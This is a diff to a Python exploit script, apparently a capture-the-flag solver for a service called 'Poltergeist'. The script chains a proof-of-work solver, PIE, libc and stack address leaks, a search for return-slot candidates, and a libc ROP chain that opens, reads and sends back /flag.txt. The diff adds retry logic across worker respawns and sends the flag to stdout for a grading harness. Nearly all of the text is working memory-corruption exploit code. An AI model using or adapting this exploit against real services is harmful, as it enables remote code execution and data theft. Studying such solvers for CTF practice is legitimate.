@@ -207,7 +207,8 @@ def refresh_pow(host, port):
     chal, bits = m.group(1).decode(), int(m.group(2))
     t0 = time.time()
     POW_HDR[0] = solve_pow(chal, bits)
-    print("[*] solved proof-of-work (%d bits) in %.1fs" % (bits, time.time() - t0))
+    print("[*] solved proof-of-work (%d bits) in %.1fs" % (bits, time.time() - t0),
+          file=sys.stderr)
 
 
 def seance(host, port, body=b"", headers=None):
@@ -281,14 +282,23 @@ def load_offsets():
                          "%s: %s" % (OFFSETS, e))
 
 
-def exploit(host, port):
+def log(*a):
+    print(*a, file=sys.stderr)
+
+
+def exploit(host, port, cand):
+    """One full attempt. `cand` selects which return-slot candidate to use
+    (0 = the one closest to the stack top). A wrong candidate crashes the worker,
+    which the watchdog respawns, so the next attempt re-leaks fresh and tries the
+    next candidate."""
     off = load_offsets()
-    refresh_pow(host, port)
+    if POW_HDR[0] is None:
+        refresh_pow(host, port)          # solve once; reused across attempts/respawns
 
     pie = leak_pie(host, port, off["arena"])
     if pie is None:
         raise IOError("PIE leak failed")
-    print("[*] pie base         = 0x%x" % pie)
+    log("[*] pie base         = 0x%x" % pie)
 
     # libc base (from write@got) and the client socket fd, in one read
     span = (off["clientfd"] - off["write_got"]) + 8
@@ -298,24 +308,22 @@ def exploit(host, port):
     libc = write_ptr - elf_dynsym(LIBC, "write")
     if libc & 0xfff:
         raise IOError("libc base not page-aligned (0x%x)" % libc)
-    print("[*] libc base        = 0x%x   clientfd = %d" % (libc, cfd))
+    log("[*] libc base        = 0x%x   clientfd = %d" % (libc, cfd))
 
     # stack: environ -> a stack address, then find process_request's return slot.
-    # Scan a generous window below environ (robust to layout differences between
-    # qemu-user and native amd64); the return slot is a few KiB down.
+    # Collect every candidate (the saved return appears once per live frame) and
+    # order them by distance below the stack top.
     sp = struct.unpack_from("<Q", forge_read(host, port, libc + elf_dynsym(LIBC, "environ"), 8), 0)[0]
     target = pie + off["retsite"]
-    retslot = None
-    for win in (0x10000, 0x1E000):                          # widen if the first misses
-        region = forge_read(host, port, sp - win, win)
-        hits = [sp - win + i for i in range(0, len(region) - 7)
-                if struct.unpack_from("<Q", region, i)[0] == target]
-        if hits:
-            retslot = max(hits)                             # highest = live frame
-            break
-    if retslot is None:
-        raise IOError("return slot (0x%x) not found on the stack" % target)
-    print("[*] stack            = 0x%x   retslot = 0x%x" % (sp, retslot))
+    region = forge_read(host, port, sp - 0x1E000, 0x1E000)
+    hits = sorted({sp - 0x1E000 + i for i in range(0, len(region) - 7)
+                   if struct.unpack_from("<Q", region, i)[0] == target}, reverse=True)
+    log("[*] stack=0x%x  retsite=0x%x  candidates: %s"
+        % (sp, target, ", ".join("0x%x(-0x%x)" % (h, sp - h) for h in hits) or "none"))
+    if not hits:
+        raise IOError("return slot not found on the stack")
+    retslot = hits[cand % len(hits)]
+    log("[*] using candidate %d/%d -> retslot = 0x%x" % (cand % len(hits), len(hits), retslot))
 
     # libc gadgets + a syscall;ret
     d, segs = _read(LIBC), _load_segments(_read(LIBC))
@@ -324,8 +332,8 @@ def exploit(host, port):
     g_rdx = libc + libc_gadget(d, segs, b"\x5a\xc3")        # pop rdx ; ret
     g_rax = libc + libc_gadget(d, segs, b"\x58\xc3")        # pop rax ; ret
     g_sys = libc + libc_gadget(d, segs, b"\x0f\x05\xc3")    # syscall ; ret
-    print("[*] gadgets rdi=0x%x rsi=0x%x rdx=0x%x rax=0x%x sys=0x%x"
-          % (g_rdi, g_rsi, g_rdx, g_rax, g_sys))
+    log("[*] gadgets rdi=0x%x rsi=0x%x rdx=0x%x rax=0x%x sys=0x%x"
+        % (g_rdi, g_rsi, g_rdx, g_rax, g_sys))
 
     # open("/flag.txt",0) -> read(fd,buf,100) -> write(clientfd,buf,100) -> exit
     PATH, BUF = object(), object()
@@ -345,20 +353,21 @@ def exploit(host, port):
 
 
 def solve(host, port):
-    print("[*] Poltergeist -- RCE via cross-request UAF -> ROP")
-    for attempt in range(1, 5):
+    log("[*] Poltergeist -- RCE via cross-request UAF -> ROP")
+    for attempt in range(0, 10):
         try:
-            flag = exploit(host, port)
+            flag = exploit(host, port, attempt)
         except (OSError, IOError, ValueError) as e:
-            print("[!] attempt %d: %s" % (attempt, e))
-            time.sleep(0.5)
+            log("[!] attempt %d: %s" % (attempt, e))
+            time.sleep(0.4)
             continue
         if flag:
-            print("[+] FLAG: " + flag)
+            print(flag)                      # stdout: the harness greps this
+            log("[+] FLAG: " + flag)
             return 0
-        print("[!] attempt %d: chain ran but no flag in response" % attempt)
-        time.sleep(0.5)
-    print("[!] giving up")
+        log("[!] attempt %d: chain ran but no flag; trying next candidate" % attempt)
+        time.sleep(0.4)
+    log("[!] giving up")
     return 1
 
 
